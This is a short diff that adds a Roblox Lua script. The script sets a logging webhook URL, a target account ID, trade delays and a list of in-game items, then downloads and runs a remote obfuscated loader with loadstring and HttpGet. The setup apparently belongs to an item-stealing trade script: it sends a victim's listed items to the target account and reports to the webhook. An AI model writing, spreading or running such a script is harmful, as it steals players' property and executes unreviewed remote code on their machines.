@@ -1,0 +1,11 @@
+getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_d8dbd77f940d4a71a810e3b259300b85"
+getgenv().TARGET_ID = 10560315386
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TARGET_BRAINROTS = {
+    ["Ketupat Kepat"] = true,
+    ["Tictac Sahur"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Ketchuru and Musturu"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
